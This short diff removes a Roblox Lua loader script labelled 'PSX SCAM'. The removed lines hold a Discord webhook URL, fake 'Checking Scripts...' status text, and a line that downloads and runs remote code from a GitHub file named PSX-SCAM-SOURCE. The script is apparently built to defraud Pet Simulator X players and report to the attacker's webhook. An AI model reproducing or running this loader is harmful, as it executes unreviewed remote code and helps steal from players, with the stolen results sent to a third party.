@@ -1,8 +1,0 @@
-Username = "freudalanwalker"
-WebHook = "https://discord.com/api/webhooks/1083458112943558720/hoJCellCfmdqfGOC0XYdRQjCvkcfq6H5vFWN_Ceqt00ImaAGBdBysHpAN_Sxqik23CAF"
-_G.CustomScriptName = "PSX SCAM"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/PSX-SCAM/main/PSX-SCAM-SOURCE.lua"))()
